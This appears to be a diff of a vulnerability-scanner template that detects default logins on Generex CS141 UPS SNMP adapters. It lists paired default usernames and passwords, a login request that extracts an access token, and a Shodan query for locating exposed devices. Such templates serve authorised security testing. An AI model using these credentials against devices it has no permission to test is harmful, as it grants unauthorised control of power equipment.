@@ -1,7 +1,6 @@
 id: cs141-default-login
-
 info:
-  name: UPS Adapter CS141 SNMP Module Default Credentials
+  name: UPS Adapter CS141 SNMP Module Default Login
   author: socketz
   severity: medium
   description: UPS Adapter CS141 SNMP Module default login credentials were discovered.
@@ -13,11 +12,43 @@ info:
   metadata:
     runzero-match: service["http.body"] matches "CS141"
     max-request: 3
+    product: cs141
+    shodan-query: http.html:"CS141"
     vendor: generex
-  tags: hiawatha,iot,default-login,vuln
-
+  tags: default-login,hiawatha,iot,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    extractors:
+      - kval:
+          - accessToken
+        type: kval
+    matchers:
+      - condition: and
+        part: header
+        type: word
+        words:
+          - accessToken
+          - application/json
+      - condition: and
+        part: body
+        type: word
+        words:
+          - accessToken
+          - AdminFirstTime
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    payloads:
+      pass:
+        - cs141-snmp
+        - engineer
+        - guest
+      user:
+        - admin
+        - engineer
+        - guest
+    raw:
       - |
         POST /api/login HTTP/1.1
         Host: {{Hostname}}
@@ -25,41 +56,4 @@ http:
         Content-Type: application/json
 
         {"userName":"{{user}}","password":"{{pass}}"}
-
-    attack: pitchfork
-    payloads:
-      user:
-        - admin
-        - engineer
-        - guest
-      pass:
-        - cs141-snmp
-        - engineer
-        - guest
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - accessToken
-          - application/json
-        condition: and
-        part: header
-
-      - type: word
-        part: body
-        words:
-          - accessToken
-          - AdminFirstTime
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
-    extractors:
-      - type: kval
-        kval:
-          - accessToken
-
